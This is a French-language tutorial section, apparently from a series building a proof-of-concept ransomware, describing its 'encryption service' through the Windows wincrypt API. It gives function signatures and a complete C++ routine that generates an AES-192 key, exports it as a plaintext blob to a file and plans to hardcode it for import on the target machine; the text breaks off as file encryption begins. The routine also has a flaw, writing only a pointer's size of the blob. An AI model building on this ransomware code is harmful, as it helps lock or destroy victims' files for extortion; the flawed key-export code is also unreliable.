# Le service d'encryption

Le coeur de notre ransomware PoC reste son service d'encryption. Pour cet aspect, Microsoft met à notre disposition la librairie wincrypt, inclue dans le set API Windows (https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta). Celle-ci sera supposément bientôt dépréciée, et remplacée par le standard CNG (https://docs.microsoft.com/en-us/windows/win32/seccng/cng-portal et https://docs.microsoft.com/fr-fr/windows/win32/seccng/encrypting-data-with-cng), mais en attendant, nous nous en contenterons.

## La gestion cryptographique avec l'API Windows ; théorie

Le trio de fonctions le plus importantes restent :

### CryptAcquireContextA

Qui nous permet l'acquisition d'une handle vers le container de clé d'un fournisseur de services cryptographiques (CSP selon la doc Microsoft). Cette handle sera ré-utilisée par les autres fonctions de wincrypt.

```cpp
BOOL CryptAcquireContextA(
  [out] HCRYPTPROV *phProv,
  [in]  LPCSTR     szContainer,
  [in]  LPCSTR     szProvider,
  [in]  DWORD      dwProvType,
  [in]  DWORD      dwFlags
);
```

### CryptGenKey

Qui permet la génération de notre clé.

```cpp
BOOL CryptGenKey(
  [in]  HCRYPTPROV hProv,
  [in]  ALG_ID     Algid,
  [in]  DWORD      dwFlags,
  [out] HCRYPTKEY  *phKey
);
```

### CryptExportKey

Export de la clé. Utilisé deux fois, d'abord pour calculer la longueur de notre futur "blob", puis pour remplir celui-ci avec une structure de type PLAINTEXTKEYBLOB, avec entre les deux un petit malloc à notre blob en utilisant la longueur du blob calculée la première fois.

La fonction :
```cpp
BOOL CryptExportKey(
  [in]      HCRYPTKEY hKey,
  [in]      HCRYPTKEY hExpKey,
  [in]      DWORD     dwBlobType,
  [in]      DWORD     dwFlags,
  [out]     BYTE      *pbData,
  [in, out] DWORD     *pdwDataLen
);
```

La structure en question. Pour une clé AES-192, notre blob fera donc un total de 36 bytes

```cpp
typedef struct _PLAINTEXTKEYBLOB {
  BLOBHEADER hdr;
  DWORD      dwKeySize;
  BYTE       rgbKeyData[];
} PLAINTEXTKEYBLOB, *PPLAINTEXTKEYBLOB;
```

## La gestion cryptographique avec l'API Windows : pratique.

Voilà donc à quoi ressemble notre code final pour la génération de clé


```cpp
  int genkey(){

  HCRYPTPROV prov = NULL;
  HCRYPTKEY clé = NULL;
  DWORD bloblen = 0;
  BYTE* blob;
  bool ok;

  if (CryptAcquireContextW(&prov, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {

    std::cout << "Context acquired" << std::endl;
  }
  else {
    DWORD d = GetLastError();
    std::cout << "Failure to acquire context" << d << std::endl;
    return -1;
  }

  if (CryptGenKey(prov, CALG_AES_192, 0x00C00000 | CRYPT_EXPORTABLE, &clé)) {
    std::cout << "Key Generated : " << clé << std::endl;

  }
  else {
    DWORD d = GetLastError();
    std::cout << "Failure to generate key, error code : " << d << std::endl;
    CryptDestroyKey(clé);
    CryptReleaseContext(prov, 0);
    return -1;

  }


  if (CryptExportKey(clé, 0, PLAINTEXTKEYBLOB, 0, NULL, &bloblen)) {

    std::cout << "Size of the blob determined : " << bloblen << std::endl;
  }
  else {
    DWORD d = GetLastError();
    std::cout << "Error calculating the length, error code : " << d << std::endl;
    return -1;
  }

  if (blob = (BYTE*)malloc(bloblen)) {

    std::cout << "Memory has been allocated to the blob :" << sizeof(blob) << std::endl;
  }
  else {
    DWORD d = GetLastError();
    std::cout << "Out of memory, error code : " << d << std::endl;
    return -1;
  }
  
  ok = CryptExportKey(clé, 0, PLAINTEXTKEYBLOB, 0, blob, &bloblen);

  if (ok == FALSE) {

    DWORD d = GetLastError();
    std::cout << "Error exporting key, error code : " << d << std::endl;
    free(blob);
    return -1;
  }
  else {
    std::cout << "Content written to the blob" << std::endl;
    std::cout << "Here's the raw blob value :" << blob << std::endl;

    std::ofstream bytefile("byte.txt",std::ios::binary);
    bytefile.write((const char*)blob,sizeof(blob));
    bytefile.close();

  }

return 0;
}
  ```

  Une fois celle-ci créée, elle peut être ré-importée (dans notre cas sous la forme d'un array de bytes hardcodé) lorsque le ransomware s'exécutera sur la machine de test cible via la fonction CryptImportKey (qui requiert un CSP valide, et donc l'exécution locale de CryptAcquireContextW au préalable) :

```cpp
BOOL CryptImportKey(
  [in]  HCRYPTPROV hProv,
  [in]  const BYTE *pbData,
  [in]  DWORD      dwDataLen,
  [in]  HCRYPTKEY  hPubKey,
  [in]  DWORD      dwFlags,
  [out] HCRYPTKEY  *phKey
);
```

## L'encryption des fichiers avec une clé : théorie

L'idée reste simple, en utilisant la fonction ReadFile, qui ouvre une handle vers un fichier spécifique (en le créant au passage si il n'existe pas et que le paramètre approprié est précisé)